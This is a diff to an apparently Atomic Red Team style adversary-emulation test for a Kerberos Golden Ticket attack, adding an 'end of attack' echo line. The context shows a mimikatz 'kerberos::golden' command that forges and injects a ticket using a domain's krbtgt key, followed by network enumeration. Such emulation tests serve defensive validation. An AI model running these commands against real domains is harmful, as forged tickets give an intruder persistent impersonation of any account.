@@ -53,5 +53,6 @@ atomic_tests:
       klist purge
       #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"
       net view \\#{machine}.#{domain}
+      echo End of Golden Ticket attack
     cleanup_command: |
       klist purge
